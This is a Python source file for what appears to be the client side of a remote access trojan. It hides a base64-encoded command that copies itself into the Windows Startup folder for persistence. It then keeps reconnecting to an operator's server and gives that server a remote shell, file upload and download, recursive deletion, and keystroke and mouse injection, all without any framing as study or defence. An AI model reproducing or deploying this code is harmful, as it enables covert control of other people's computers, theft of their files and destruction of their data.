import socket
import subprocess
import sys
import time
import random
import os
import shutil
import base64
import pyautogui


SERVER_HOST = "SERVER IP"
SERVER_PORT = 6969

BUFFER_SIZE = 536870912
subprocess.getoutput(base64.b64decode("Y29weSBjbGllbnQucHl3ICIlYXBwZGF0YSVcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwIg==").decode())

if not os.path.exists("payloads"):
    os.mkdir("payloads")





while True:
    s = socket.socket()
    try:
    #while True:
        s.connect((SERVER_HOST, SERVER_PORT))

        message = s.recv(BUFFER_SIZE).decode()
        print("Server:", message)
    
        while True:
            global filename
            rd = s.recv(BUFFER_SIZE)

            command = rd
            if command != b"!!::SKIP::!!":

                #################################
                if rd == b'':
                    break
                elif command.lower() == b"cmd::exit":
                    print("Server: Disconnected")
                    break
                
                elif command[:7].lower() == b"cmd::cd":
                    try:
                        dir = command[8:].decode()
                        os.chdir(dir)
                        output = f"changed dir to <{dir}>"
                        s.send(output.encode())
                    except FileNotFoundError:
                        output = f"<{dir}> does not exist"
                        s.send(output.encode())
                    except PermissionError:
                        output = f"you do not have enough permissions to access <{dir}>"
                        s.send(output.encode())
                    except:
                        output = f"There was an error."
                        s.send(output.encode())


                ########

                elif rd[:8] == b"!upload ":
                    filename = command[8:].decode()

                elif rd[:5] == b"FILE:":
                        try:
                            fane = filename
                            fane = os.path.basename(fane)
                        except NameError:
                            fane = str(random.randint(100000,999999)) + ".txt"
                        filedata = rd[5:]
                        try:
                            with open(f"{fane}", "wb") as w:
                                w.write(filedata)
                            i = 0
                            while True:
                                
                                
                                s.send("ACK".encode())
                                
                                rd = s.recv(BUFFER_SIZE)
                                if rd == b"<FINISHED>":
                                    s.send("<FINISHED>".encode())
                                    break
                                    
                                with open(f"{fane}", "ab") as w:
                                    w.write(rd)

                                i=i+1
                        except PermissionError:
                            s.send("<ERROR>".encode())
                            a = s.recv(BUFFER_SIZE)
                            if a.decode() == "<FINISHED>":
                                s.send("PermissionError".encode())


                            
                        continue





                #########

                elif command[:6].lower() == b"!type ":
                    time.sleep(1)
                    type = command[6:].decode()
                    type = type.split("<|>")
                    for colon in type:
                        if colon[0] == "<" and colon[-1] == ">":
                            pyautogui.press(colon[1:-1])
                        else:
                            pyautogui.typewrite(colon, 0.01)
                        time.sleep(0.1)
                    
                    output = b"Finished Typing"
                    s.send(output)
                    
                
                elif command[:9].decode() == "!payload ":
                    time.sleep(1)
                    file = command[9:].decode()
                    try:
                        with open(file, "r") as f:
                            lines = f.readlines()
                            llllll = 1
                            for line in lines:
                                
                                a = line.split(" ")[0].upper()
                                arg = "".join(line.split(" ", 1)[1])
                                if a.upper() == "HOTKEY":
                                    listsss = arg.split("+")
                                    hotkey = [item.replace("\n", "") for item in listsss]
                                    pyautogui.hotkey(*hotkey)

                                elif a.upper() == "SLEEP":
                                    time.sleep(int(str(arg).strip()))
                                
                                elif a.upper() == "STRING":
                                    pyautogui.typewrite(arg, interval=0.01)


                                elif a.upper() == "PRESS":
                                    pyautogui.press(str(arg).strip())
                                
                                elif a.upper() == "MOVEMOUSE":
                                    listsss = arg.split("+")
                                    pos = [item.replace("\n", "").replace("\b", "") for item in listsss]
                                    pyautogui.moveTo(int(pos[0]),int(pos[1]))
                                
                                elif a.upper() == "LMB":
                                    for i in range(0,int(line.split(" ", 1)[1].strip())):
                                        pyautogui.leftClick()
                                
                                elif a.upper() == "RMB":
                                    for i in range(0,int(line.split(" ", 1)[1].strip())):
                                        pyautogui.rightClick()
                                
                                
                                elif a.upper() == "MMB":
                                    for i in range(0,int(line.split(" ", 1)[1].strip())):
                                        pyautogui.middleClick()

                                elif a.upper() == "SCROLL":
                                    pyautogui.scroll(int(str(arg).strip()))

                                else:
                                    print("empty line")


                                print(f"executed {llllll}")
                                llllll = llllll+1
                                time.sleep(0.5)

                            output = "finished"
                            s.send(output.encode())
                    
                    except FileNotFoundError:
                        output = f"{file} Not Existing"
                        s.send(output.encode())



                elif command[:10].lower() == b"!download ":
                    file = command[10:].decode()
                    try:
                        with open(file, 'rb') as file:
                            content = file.read()
                            total_length = len(content)
                            chunk_size = total_length // 50

                            for i in range(0, total_length, chunk_size):
                                time.sleep(0.5)
                                chunk = content[i:i+chunk_size]
                                if i == 0:
                                    output = b"FILE:" + chunk
                                else:
                                                    
                                    output = chunk
                                s.send(output)
                                s.recv(BUFFER_SIZE)
                                            
                            s.send(b"<FINISHED>")
                    except IsADirectoryError:
                        output = f"<{file}> Is a directory"
                        s.send(output.encode())
                    except FileNotFoundError:
                        output = f"<{file}> does not exist"
                        s.send(output.encode())

                
                elif command[:8].lower() == b"!remove ":
                    path = command[8:].decode()
                    if os.path.isfile(path):
                        os.remove(path)
                        output = f"The file '{path}' has been removed."
                    elif os.path.isdir(path):
                        if not os.listdir(path):
                            os.rmdir(path)
                            output = f"The directory '{path}' has been removed."
                        else:
                            shutil.rmtree(path)
                            output = f"The directory '{path}' and its contents have been removed."
                    else:
                        output = f"The path '{path}' does not exist."

                elif command[:5].decode().lower() == "cmd::":
                    command = command[5:].decode()
                    output = subprocess.getoutput(command)
                    s.send(output.encode())

                else:
                    output = "Invalid Command."
                    s.send(output.encode())
            else:
                print("SKIPPED")


        s.close()
        
    except:
        print("Error")
    
    time.sleep(2.5)